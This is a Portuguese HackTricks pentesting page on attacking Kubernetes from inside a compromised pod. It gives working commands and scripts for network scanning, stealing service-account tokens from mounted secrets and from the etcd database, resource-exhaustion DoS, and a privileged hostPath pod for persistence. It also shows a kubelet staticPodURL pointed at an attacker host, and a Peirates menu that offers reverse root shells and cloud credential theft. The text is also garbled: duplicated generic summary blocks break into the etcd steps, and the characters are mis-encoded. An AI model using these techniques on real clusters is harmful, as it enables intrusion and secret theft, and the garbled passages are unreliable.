# Attacking Kubernetes from inside a Pod

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Fuga do Pod**

**Se voc√™ tiver sorte, poder√° conseguir escapar dele para o n√≥:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Escapando do pod

Para tentar escapar do pod, voc√™ pode precisar primeiro de **escalar privil√©gios**, algumas t√©cnicas para isso:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Voc√™ pode verificar estes **breakouts do docker para tentar escapar** de um pod que voc√™ comprometeu:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Abusando dos Privil√©gios do Kubernetes

Como explicado na se√ß√£o sobre **enumera√ß√£o do kubernetes**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Geralmente, os pods s√£o executados com um **token de conta de servi√ßo** dentro deles. Esta conta de servi√ßo pode ter alguns **privil√©gios associados** que voc√™ poderia **abusar** para **mover-se** para outros pods ou at√© mesmo para **escapar** para os n√≥s configurados dentro do cluster. Veja como em:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Abusando dos Privil√©gios na Nuvem

Se o pod estiver sendo executado dentro de um **ambiente na nuvem**, voc√™ poder√° ser capaz de **vazar um token do endpoint de metadados** e escalar privil√©gios usando-o.

## Procurar servi√ßos de rede vulner√°veis

Como voc√™ est√° dentro do ambiente Kubernetes, se n√£o conseguir escalar privil√©gios abusando dos privil√©gios atuais dos pods e n√£o puder escapar do cont√™iner, voc√™ deve **procurar servi√ßos potencialmente vulner√°veis.**

### Servi√ßos

**Para esse prop√≥sito, voc√™ pode tentar obter todos os servi√ßos do ambiente kubernetes:**

```
kubectl get svc --all-namespaces
```

Por padr√£o, o Kubernetes usa um esquema de rede plana, o que significa que **qualquer pod/servi√ßo dentro do cluster pode se comunicar com outros**. Os **namespaces** dentro do cluster **n√£o possuem restri√ß√µes de seguran√ßa de rede por padr√£o**. Qualquer um no namespace pode se comunicar com outros namespaces.

### Varredura

O seguinte script Bash (retirado de um [workshop de Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) instalar√° e far√° a varredura das faixas de IP do cluster kubernetes:

```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```

Confira a seguinte p√°gina para aprender como voc√™ poderia **atacar servi√ßos espec√≠ficos do Kubernetes** para **comprometer outros pods/todo o ambiente**:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### Sniffing

Caso o **pod comprometido esteja executando algum servi√ßo sens√≠vel** onde outros pods precisem se autenticar, voc√™ pode ser capaz de obter as credenciais enviadas pelos outros pods **farejando comunica√ß√µes locais**.

## Network Spoofing

Por padr√£o, t√©cnicas como **ARP spoofing** (e gra√ßas a isso **DNS Spoofing**) funcionam na rede do Kubernetes. Ent√£o, dentro de um pod, se voc√™ tem a capacidade **NET\_RAW** (que est√° l√° por padr√£o), voc√™ ser√° capaz de enviar pacotes de rede personalizados e realizar **ataques MitM via ARP Spoofing para todos os pods executando no mesmo n√≥.**\
Al√©m disso, se o **pod malicioso** estiver executando no **mesmo n√≥ que o servidor DNS**, voc√™ ser√° capaz de realizar um **ataque de DNS Spoofing para todos os pods no cluster**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

N√£o h√° especifica√ß√£o de recursos nos manifestos do Kubernetes e **limites n√£o aplicados** para os cont√™ineres. Como atacante, podemos **consumir todos os recursos onde o pod/implanta√ß√£o est√° executando** e esgotar outros recursos e causar um DoS para o ambiente.

Isso pode ser feito com uma ferramenta como [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):

```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```

Voc√™ pode ver a diferen√ßa enquanto executa `stress-ng` e depois

```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```

## P√≥s-Explora√ß√£o do N√≥

Se voc√™ conseguiu **escapar do container**, h√° algumas coisas interessantes que voc√™ encontrar√° no n√≥:

* O processo **Container Runtime** (Docker)
* Mais **pods/containers** executando no n√≥ que voc√™ pode abusar como este (mais tokens)
* Todo o **sistema de arquivos** e **SO** em geral
* O servi√ßo **Kube-Proxy** escutando
* O servi√ßo **Kubelet** escutando. Verifique os arquivos de configura√ß√£o:
* Diret√≥rio: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* Outros **arquivos comuns do kubernetes**:
* `$HOME/.kube/config` - **Configura√ß√£o do Usu√°rio**
* `/etc/kubernetes/kubelet.conf` - **Configura√ß√£o Regular**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **Configura√ß√£o de Bootstrap**
* `/etc/kubernetes/manifests/etcd.yaml` - **Configura√ß√£o do etcd**
* `/etc/kubernetes/pki` - **Chave do Kubernetes**

### Encontrar kubeconfig do n√≥

Se voc√™ n√£o conseguir encontrar o arquivo kubeconfig em um dos caminhos anteriormente comentados, **verifique o argumento `--kubeconfig` do processo kubelet**:

```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```

### Roubar Secrets

```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```

O script [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) ir√° automaticamente **obter os tokens de outros pods e verificar se eles t√™m a permiss√£o** que voc√™ est√° procurando (em vez de voc√™ verificar um por um):

```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```

### DaemonSets Privilegiados

Um DaemonSet √© um **pod** que ser√° **executado** em **todos os n√≥s do cluster**. Portanto, se um DaemonSet for configurado com uma **conta de servi√ßo privilegiada,** em **TODOS os n√≥s** voc√™ poder√° encontrar o **token** dessa **conta de servi√ßo privilegiada** que voc√™ poderia abusar.

O exploit √© o mesmo da se√ß√£o anterior, mas agora voc√™ n√£o depende da sorte.

### Pivotar para a Nuvem

Se o cluster for gerenciado por um servi√ßo de nuvem, geralmente o **N√≥ ter√° um acesso diferente ao endpoint de metadados** do que o Pod. Portanto, tente **acessar o endpoint de metadados a partir do n√≥** (ou de um pod com hostNetwork definido como True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Roubar etcd

Se voc√™ puder especificar o [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) do N√≥ que executar√° o cont√™iner, obtenha um shell dentro de um n√≥ do plano de controle e obtenha o banco de dados **etcd**:

```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```

os n√≥s do plano de controle t√™m o **papel de master** e em **clusters gerenciados na nuvem voc√™ n√£o poder√° executar nada neles**.

#### Ler segredos do etcd

Se voc√™ conseguir executar seu pod em um n√≥ do plano de controle usando o seletor `nodeName` na especifica√ß√£o do pod, voc√™ pode ter acesso f√°cil ao banco de dados `etcd`, que cont√©m toda a configura√ß√£o do cluster, incluindo todos os segredos.

Abaixo est√° uma maneira r√°pida e suja de pegar segredos do `etcd` se ele estiver rodando no n√≥ do plano de controle em que voc√™ est√°. Se voc√™ quiser uma solu√ß√£o mais elegante que inicia um pod com a utilidade do cliente `etcdctl` e usa as credenciais do n√≥ do plano de controle para se conectar ao etcd onde quer que ele esteja rodando, confira [este exemplo de manifesto](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) de @mauilion.

**Verifique se o `etcd` est√° rodando no n√≥ do plano de controle e veja onde o banco de dados est√° (Isso √© em um cluster criado pelo `kubeadm`)**

```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```

```markdown
# Atacando Kubernetes de Dentro de um Pod

Quando voc√™ tem acesso a um pod no Kubernetes, voc√™ pode tentar explorar a configura√ß√£o e os recursos do cluster para ganhar mais controle ou acessar dados sens√≠veis. Aqui est√£o algumas t√©cnicas comuns:

## Escalonamento de Privil√©gios

- **Abuso de permiss√µes de servi√ßo de conta**: Verifique as permiss√µes associadas √† conta de servi√ßo do pod. Se estiverem configuradas de forma muito permissiva, voc√™ pode ter acesso a recursos do cluster que n√£o deveria.
- **Explora√ß√£o de roles e rolebindings**: Procure por roles e rolebindings mal configurados que possam ser explorados para escalar privil√©gios dentro do cluster.

## Movimenta√ß√£o Lateral

- **Descoberta de servi√ßos internos**: Use comandos como `kubectl` para descobrir outros servi√ßos que est√£o rodando no cluster e que podem ser acess√≠veis a partir do seu pod.
- **Ataque a outros pods**: Se voc√™ puder comunicar-se com outros pods, tente explorar vulnerabilidades conhecidas ou configura√ß√µes fracas para compromet√™-los.

## Exfiltra√ß√£o de Dados

- **Acesso a volumes persistentes**: Se o pod tiver acesso a volumes persistentes, voc√™ pode tentar acessar e exfiltrar dados armazenados l√°.
- **Intercepta√ß√£o de tr√°fego**: Monitore o tr√°fego de rede para capturar dados sens√≠veis que possam estar sendo transmitidos dentro do cluster.

## Ataques de Nega√ß√£o de Servi√ßo (DoS)

- **Consumo de recursos**: Inicie processos que consomem uma quantidade excessiva de CPU ou mem√≥ria para afetar a disponibilidade dos servi√ßos no cluster.
- **Abuso de APIs**: Fa√ßa solicita√ß√µes em massa para as APIs do Kubernetes para sobrecarregar os servidores e causar interrup√ß√µes.

## Conclus√£o

Atacar um cluster Kubernetes de dentro de um pod pode revelar vulnerabilidades significativas e potenciais vazamentos de dados. √â crucial para os administradores do cluster entender e mitigar esses riscos.
```

```bash
data-dir=/var/lib/etcd
```

**Visualizar os dados no banco de dados etcd:**

```bash
strings /var/lib/etcd/member/snap/db | less
```

**Extraia os tokens do banco de dados e mostre o nome da conta de servi√ßo**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```

**Mesmo comando, mas com alguns greps para retornar apenas o token padr√£o no namespace kube-system**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```

```markdown
# Atacando Kubernetes de Dentro de um Pod

Quando voc√™ tem acesso a um pod no Kubernetes, voc√™ pode tentar explorar a configura√ß√£o e os recursos do cluster para ganhar mais controle ou acessar dados sens√≠veis. Aqui est√£o algumas t√©cnicas comuns:

## Escalonamento de Privil√©gios

- **Abuso de ServiceAccounts**: Muitos pods t√™m ServiceAccounts associados que podem ter permiss√µes excessivas. Use `kubectl` para explorar esses direitos.
- **Explora√ß√£o de Roles e RoleBindings**: Verifique se h√° Roles ou RoleBindings mal configurados que possam ser explorados para escalar privil√©gios.

## Movimenta√ß√£o Lateral

- **Descoberta de Servi√ßos**: Use comandos como `kubectl get services` para encontrar outros servi√ßos no cluster que voc√™ pode atacar.
- **Ataque a outros Pods**: Uma vez que voc√™ tenha uma lista de servi√ßos, tente acessar ou explorar outros pods no cluster.

## Exfiltra√ß√£o de Dados

- **Acesso a Secrets e ConfigMaps**: Secrets e ConfigMaps podem conter dados sens√≠veis. Use `kubectl get secrets` ou `kubectl get configmaps` para tentar acess√°-los.
- **Intercepta√ß√£o de Tr√°fego**: Se voc√™ puder, monitore o tr√°fego de rede para capturar dados sens√≠veis.

## Denial of Service (DoS)

- **Consumo de Recursos**: Crie processos que consomem uma quantidade excessiva de CPU ou mem√≥ria para afetar a disponibilidade dos servi√ßos.
- **Abuso de API**: Fa√ßa solicita√ß√µes excessivas √† API do Kubernetes para sobrecarregar o servidor.

## Conclus√£o

Atacar um cluster Kubernetes de dentro de um pod pode ser uma maneira eficaz de explorar vulnerabilidades e comprometer um ambiente. Sempre teste essas t√©cnicas em um ambiente controlado e com permiss√£o para evitar atividades ilegais.
```

```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```

### Persist√™ncia de Pods Est√°ticos/Espelhados

_Pods Est√°ticos_ s√£o gerenciados diretamente pelo daemon kubelet em um n√≥ espec√≠fico, sem a observa√ß√£o do servidor API. Diferentemente de Pods que s√£o gerenciados pelo plano de controle (por exemplo, um Deployment); em vez disso, o **kubelet monitora cada Pod est√°tico** (e o reinicia se falhar).

Portanto, Pods est√°ticos est√£o sempre **vinculados a um Kubelet** em um n√≥ espec√≠fico.

O **kubelet tenta automaticamente criar um Pod espelho no servidor API do Kubernetes** para cada Pod est√°tico. Isso significa que os Pods executados em um n√≥ s√£o vis√≠veis no servidor API, mas n√£o podem ser controlados a partir de l√°. Os nomes dos Pods ser√£o sufixados com o nome do host do n√≥ com um h√≠fen √† frente.

{% hint style="danger" %}
O **`spec` de um Pod est√°tico n√£o pode se referir a outros objetos da API** (por exemplo, ServiceAccount, ConfigMap, Secret, etc.). Ent√£o **voc√™ n√£o pode abusar desse comportamento para lan√ßar um pod com um serviceAccount arbitr√°rio** no n√≥ atual para comprometer o cluster. Mas voc√™ poderia usar isso para executar pods em diferentes namespaces (caso isso seja √∫til por algum motivo).
{% endhint %}

Se voc√™ estiver dentro do host do n√≥, pode faz√™-lo criar um **Pod est√°tico dentro dele mesmo**. Isso √© bastante √∫til porque pode permitir que voc√™ **crie um pod em um namespace diferente**, como **kube-system**.

Para criar um Pod est√°tico, a [**documenta√ß√£o √© de grande ajuda**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Voc√™ basicamente precisa de 2 coisas:

* Configurar o par√¢metro **`--pod-manifest-path=/etc/kubernetes/manifests`** no **servi√ßo kubelet**, ou na **configura√ß√£o do kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) e reiniciar o servi√ßo
* Criar a defini√ß√£o no **pod definition** em **`/etc/kubernetes/manifests`**

**Outra maneira mais furtiva seria:**

* Modificar o par√¢metro **`staticPodURL`** do arquivo de configura√ß√£o do **kubelet** e definir algo como `staticPodURL: http://attacker.com:8765/pod.yaml`. Isso far√° com que o processo kubelet crie um **Pod est√°tico** obtendo a **configura√ß√£o da URL indicada**.

**Exemplo** de configura√ß√£o de **pod** para criar um pod privilegiado em **kube-system** retirado de [**aqui**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):

```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```

### Excluir pods + n√≥s n√£o program√°veis

Se um atacante **comprometeu um n√≥** e ele pode **excluir pods** de outros n√≥s e **tornar outros n√≥s incapazes de executar pods**, os pods ser√£o reiniciados no n√≥ comprometido e ele poder√° **roubar os tokens** executados neles.\
Para [**mais informa√ß√µes, siga estes links**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Ferramentas Autom√°ticas

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)

```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```

* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>Aprenda a hackear AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
